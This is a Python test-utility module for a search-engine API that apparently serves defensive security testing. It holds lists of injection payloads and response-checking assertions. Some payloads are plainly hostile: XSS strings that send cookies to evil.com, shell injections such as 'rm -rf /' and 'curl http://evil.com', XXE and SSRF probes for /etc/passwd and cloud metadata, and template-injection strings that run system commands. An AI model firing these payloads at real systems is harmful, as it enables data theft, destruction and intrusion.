"""
Security testing utilities for Nebula Search Engine.

This module provides common utilities, payloads, and helper functions
for security testing including injection attacks, XSS, CSRF, etc.
"""

from typing import List, Dict, Any, Optional
from fastapi.testclient import TestClient
from app.services.auth import create_access_token


class SecurityPayloads:
    """Collection of security test payloads."""
    
    # SQL Injection Payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND 1=1#",
        "1' AND 1=2#",
        "' OR 'x'='x",
        "' OR 'x'='x'--",
        "' OR 'x'='x'/*",
        "'; DROP TABLE users; --",
        "'; DELETE FROM users; --",
        "'; UPDATE users SET password='hacked'; --",
        "1; SELECT * FROM users",
        "1; SELECT * FROM users--",
        "' OR EXISTS(SELECT * FROM users) --",
        "' OR 1=1 LIMIT 1 OFFSET 0--",
        "' OR 1=1 ORDER BY 1--",
        "' OR 1=1 GROUP BY 1--",
        "' OR 1=1 HAVING 1=1--",
    ]
    
    # XSS Payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<div style=\"width:100px;height:100px;background:url('javascript:alert(1)')\">",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<object data=\"javascript:alert('XSS')\">",
        "<embed src=\"javascript:alert('XSS')\">",
        "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "<form action=\"javascript:alert('XSS')\">",
        "<button onclick=\"alert('XSS')\">Click</button>",
        "<details open ontoggle=\"alert('XSS')\">",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "javascript:alert(document.domain)",
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
        "<script>new Image().src='https://evil.com?c='+document.cookie</script>",
        "<script>document.location='https://evil.com?c='+document.cookie</script>",
    ]
    
    # Command Injection Payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| ls -la",
        "&& ls -la",
        "|| ls -la",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "|| cat /etc/passwd",
        "; whoami",
        "| whoami",
        "&& whoami",
        "|| whoami",
        "$(whoami)",
        "`whoami`",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        "; rm -rf /",
        "| rm -rf /",
        "&& rm -rf /",
        "|| rm -rf /",
        "; curl http://evil.com",
        "| curl http://evil.com",
        "&& curl http://evil.com",
        "|| curl http://evil.com",
    ]
    
    # Path Traversal Payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam",
        "/etc/passwd",
        "C:\\windows\\system32\\config\\sam",
        "file:///etc/passwd",
        "file:///C:/windows/system32/config/sam",
        "php://filter/read=convert.base64-encode/resource=etc/passwd",
        "phar:///etc/passwd",
    ]
    
    # SSRF Payloads
    SSRF_PAYLOADS = [
        "http://localhost:8080/admin",
        "http://127.0.0.1:8080/admin",
        "http://[::1]:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://0.0.0.0:8080/admin",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:5432",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:27017",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "gopher://127.0.0.1:25/",
        "dict://127.0.0.1:6379/INFO",
    ]
    
    # LDAP Injection Payloads
    LDAP_INJECTION_PAYLOADS = [
        "*",
        "*)(&",
        "*))%00",
        "admin*",
        "admin*)((|userPassword=*)",
        "*)(uid=*))(|(uid=*",
        ")(cn=*))%00",
        "*)(|(password=*)",
    ]
    
    # XML Injection Payloads
    XML_INJECTION_PAYLOADS = [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><foo>&xxe;</foo>",
    ]
    
    # NoSQL Injection Payloads
    NOSQL_INJECTION_PAYLOADS = [
        {"$ne": None},
        {"$ne": ""},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$where": "true"},
        {"$where": "function() { return true; }"},
        {"$or": [{"email": "test@example.com"}, {"email": {"$ne": ""}}]},
        {"$and": [{"email": "test@example.com"}, {"password": {"$ne": ""}}]},
    ]
    
    # Template Injection Payloads
    TEMPLATE_INJECTION_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config.items()}}",
        "{{config.__class__.__init__.__globals__['os'].system('id')}}",
        "{{request.application.__globals__.__builtins__.__import__('os').system('id')}}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}",
    ]


class SecurityTestHelper:
    """Helper functions for security testing."""
    
    @staticmethod
    def get_auth_header(user_email: str = "test@example.com", 
                       role: str = "user") -> Dict[str, str]:
        """Get authentication header for testing.
        
        Args:
            user_email: User email
            role: User role
        
        Returns:
            Authorization header dict
        """
        token = create_access_token(user_email, role=role)
        return {"Authorization": f"Bearer {token}"}
    
    @staticmethod
    def get_admin_header() -> Dict[str, str]:
        """Get admin authentication header.
        
        Returns:
            Authorization header dict for admin
        """
        return SecurityTestHelper.get_auth_header(role="admin")
    
    @staticmethod
    def assert_no_sql_injection(response_text: str):
        """Assert that response doesn't contain SQL error messages.
        
        Args:
            response_text: Response text to check
        """
        sql_errors = [
            "sqlite3.OperationalError",
            "sqlite3.IntegrityError",
            "psycopg2.Error",
            "MySQLdb.Error",
            "OperationalError",
            "ProgrammingError",
            "IntegrityError",
            "InternalError",
            "Syntax error",
            "syntax error",
            "unexpected end of SQL statement",
            "column",
            "table",
            "SELECT",
            "INSERT",
            "UPDATE",
            "DELETE",
            "DROP",
        ]
        
        response_lower = response_text.lower()
        for error in sql_errors:
            assert error.lower() not in response_lower, \
                f"Potential SQL injection vulnerability detected: {error}"
    
    @staticmethod
    def assert_no_xss(response_text: str):
        """Assert that response doesn't contain unescaped XSS payloads.
        
        Args:
            response_text: Response text to check
        """
        dangerous_patterns = [
            "<script>",
            "javascript:",
            "onerror=",
            "onload=",
            "onfocus=",
            "onclick=",
            "onmouseover=",
        ]
        
        for pattern in dangerous_patterns:
            assert pattern not in response_text.lower(), \
                f"Potential XSS vulnerability detected: {pattern}"
    
    @staticmethod
    def assert_no_path_traversal(response_text: str):
        """Assert that response doesn't contain file system paths.
        
        Args:
            response_text: Response text to check
        """
        path_patterns = [
            "/etc/passwd",
            "/etc/shadow",
            "windows/system32",
            "root:",
            "daemon:",
            "bin:",
        ]
        
        response_lower = response_text.lower()
        for pattern in path_patterns:
            assert pattern not in response_lower, \
                f"Potential path traversal vulnerability detected: {pattern}"
    
    @staticmethod
    def assert_proper_error_handling(response_text: str):
        """Assert that error messages don't leak sensitive information.
        
        Args:
            response_text: Response text to check
        """
        sensitive_info = [
            "Traceback",
            "File \"/",
            "line ",
            "SyntaxError",
            "NameError",
            "TypeError",
            "AttributeError",
            "KeyError",
            "IndexError",
            "ValueError",
            "ImportError",
            "ModuleNotFoundError",
        ]
        
        for info in sensitive_info:
            assert info not in response_text, \
                f"Potential information disclosure: {info}"
    
    @staticmethod
    def assert_security_headers(headers: Dict[str, str]):
        """Assert that security headers are present.
        
        Args:
            headers: Response headers dict
        """
        required_headers = {
            "x-frame-options": ["DENY", "SAMEORIGIN"],
            "x-content-type-options": ["nosniff"],
            "x-xss-protection": ["1", "1; mode=block"],
            "strict-transport-security": None,  # Should be present in production
        }
        
        for header, valid_values in required_headers.items():
            if header in [k.lower() for k in headers.keys()]:
                header_value = headers.get(header) or headers.get(header.title())
                if valid_values:
                    assert any(valid_value in header_value for valid_value in valid_values), \
                        f"Invalid {header} value: {header_value}"
    
    @staticmethod
    def assert_rate_limit_headers(headers: Dict[str, str]):
        """Assert that rate limit headers are present.
        
        Args:
            headers: Response headers dict
        """
        rate_limit_headers = [
            "x-ratelimit-limit",
            "x-ratelimit-remaining",
            "x-ratelimit-reset",
        ]
        
        # At least one rate limit header should be present
        has_rate_limit = any(
            header in [k.lower() for k in headers.keys()]
            for header in rate_limit_headers
        )
        
        # Note: This might not be present in test environment
        # So we'll just log a warning instead of failing
        if not has_rate_limit:
            print("Warning: Rate limit headers not found")


def test_injection_payload(
    client: TestClient,
    endpoint: str,
    method: str,
    payload: Any,
    auth_header: Optional[Dict[str, str]] = None,
    expected_status: int = 400
) -> bool:
    """Test if an injection payload is properly handled.
    
    Args:
        client: Test client
        endpoint: API endpoint
        method: HTTP method
        payload: Injection payload
        auth_header: Optional auth header
        expected_status: Expected HTTP status code
    
    Returns:
        True if payload was safely handled, False otherwise
    """
    headers = auth_header or {}
    
    try:
        if method.upper() == "GET":
            response = client.get(endpoint, headers=headers, params={"q": payload})
        elif method.upper() == "POST":
            response = client.post(endpoint, headers=headers, json={"input": payload})
        else:
            return False
        
        # Should return error status, not 500
        if response.status_code == 500:
            return False
        
        # Check response doesn't contain sensitive info
        response_text = response.text
        SecurityTestHelper.assert_no_sql_injection(response_text)
        SecurityTestHelper.assert_no_xss(response_text)
        SecurityTestHelper.assert_no_path_traversal(response_text)
        SecurityTestHelper.assert_proper_error_handling(response_text)
        
        return True
    
    except Exception as e:
        print(f"Error testing payload: {e}")
        return False